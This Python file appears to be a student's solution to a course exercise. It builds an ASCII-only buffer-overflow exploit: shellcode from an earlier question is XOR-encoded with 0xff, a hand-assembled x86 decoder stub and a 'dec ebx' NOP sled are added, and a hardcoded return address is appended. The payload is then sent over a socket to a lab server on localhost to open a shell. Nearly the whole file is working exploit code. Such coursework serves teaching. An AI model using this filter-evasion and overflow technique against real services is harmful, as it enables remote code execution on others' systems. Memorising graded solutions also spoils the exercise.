import functools
import os
import socket
import traceback
import q2
import struct

from infosec.core import assemble, smoke
from typing import Tuple, Iterable


HOST = '127.0.0.1'
SERVER_PORT = 8000
LOCAL_PORT = 1337


ASCII_MAX = 0x7f


def warn_invalid_ascii(selector=None):
    selector = selector or (lambda x: x)

    def decorator(func):
        @functools.wraps(func)
        def result(*args, **kwargs):
            ret = func(*args, **kwargs)
            if any(c > ASCII_MAX for c in selector(ret)):
                smoke.warning(f'Non ASCII chars in return value from '
                              f'{func.__name__} at '
                              f'{"".join(traceback.format_stack()[:-1])}')
            return ret
        return result
    return decorator


def get_raw_shellcode():
    return q2.get_shellcode()


@warn_invalid_ascii(lambda result: result[0])
def encode(data: bytes) -> Tuple[bytes, Iterable[int]]:
    """Encode the given data to be valid ASCII.

    As we recommended in the exercise, the easiest way would be to XOR
    non-ASCII bytes with 0xff, and have this function return the encoded data
    and the indices that were XOR-ed.

    Tips:
    1. To return multiple values, do `return a, b`

    Args:
        data - The data to encode

    Returns:
        A tuple of [the encoded data, the indices that need decoding]
    """
    XOR_VAL = 0xff
    indices_array = []
    xored_data = []
    
    for i in range(len(data)):
        byte = data[i]
        if data[i] > ASCII_MAX:
            byte = byte ^ XOR_VAL
            indices_array.append(i)
            
        xored_data.append(byte)
    return bytes(xored_data), indices_array
    
    
    
    


@warn_invalid_ascii()
def get_decoder_code(indices: Iterable[int]) -> bytes:
    """This function returns the machine code (bytes) of the decoder code.

    In this question, the "decoder code" should be the code which decodes the
    encoded shellcode so that we can properly execute it. Assume you already
    have the address of the shellcode, and all you need to do here is to do the
    decoding.

    Args:
        indices - The indices of the shellcode that need the decoding (as
        returned from `encode`)

    Returns:
         The decoder coder (assembled, as bytes)
    """
    
    #xff_ value :##PUSH 0
                  #POP EBX
                  #DEC EBX ->> EBX = 0xFFFFFFFF ->> BL = 0xff
    xff_value = [0x6a,0x00,0x5b,0x4B] 
    xor_operation = [0x30,0x18]
    inc_eax_operation = 0x40
    prev = 0
    res = []
    
    res += xff_value
    
    for i in indices:
        #put "nop like" operation between every 2 indices.
        for j in range(prev,i):
            res.append(inc_eax_operation)
        prev = i #advance for next iteration
        
        res += xor_operation #xor the [eax], 0xff
   
    return bytes(res)


@warn_invalid_ascii()
def get_ascii_shellcode() -> bytes:
    """This function returns the machine code (bytes) of the shellcode.

    In this question, the "shellcode" should be the code which if we put EIP to
    point at, it will open the shell. Since we need this shellcode to be
    entirely valid ASCII, the "shellcode" is made of the following:

    - The instructions needed to find the address of the encoded shellcode
    - The encoded shellcode, which is just the shellcode from q2 after encoding
      it using the `encode()` function we defined above
    - The decoder code needed to extract the encoded shellcode

    As before, this does not include the size of the message sent to the server,
    the return address we override, the nop slide or anything else!

    Tips:
    1. This function is for your convenience, and will not be tested directly.
       Feel free to modify it's parameters as needed.
    2. Use the `assemble` module to translate any additional instructions into
       bytes.

    Returns:
         The bytes of the shellcode.
    """
    q2_shellcode = get_raw_shellcode()
    ESP_to_EAX = [0x54,0x58] #push esp, pop eax
    DEC_EAX = 0x48
    direct_eax = []
    
    direct_eax += ESP_to_EAX
    
    for i in range(4 + len(q2_shellcode)):
        direct_eax.append(DEC_EAX) #EAX--;
    #after using direct_eax, eax will point 
    #to the beginning ofthe encoded shellcode
    
    encoded_shellcode, indices = encode(q2_shellcode) 
    decoder_code = get_decoder_code(indices)
    
    
    #return only the ascii shellcode
    return bytes(direct_eax) + decoder_code + encoded_shellcode
    
    


@warn_invalid_ascii(lambda payload: payload[4:-5])
def get_payload() -> bytes:
    """This function returns the data to send over the socket to the server.

    This includes everything - the 4 bytes for size, the nop slide, the
    shellcode, the return address (and the zero at the end).

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Returns:
         The bytes of the payload.
    """
    
    size = 1044 # = shellcode size
    #encode() does not change the size of message
    asm = get_ascii_shellcode()
    NOPs_amount = size - len(asm) - 4
    NOPs = bytes([0x49 for i in range(NOPs_amount)]) #dec EBX nop like op
    
    ra = struct.pack('<I', 0xBFFFDD9C) #return address

    return struct.pack('>I', size) + NOPs + asm + ra


def main():
    # WARNING: DON'T EDIT THIS FUNCTION!
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, SERVER_PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
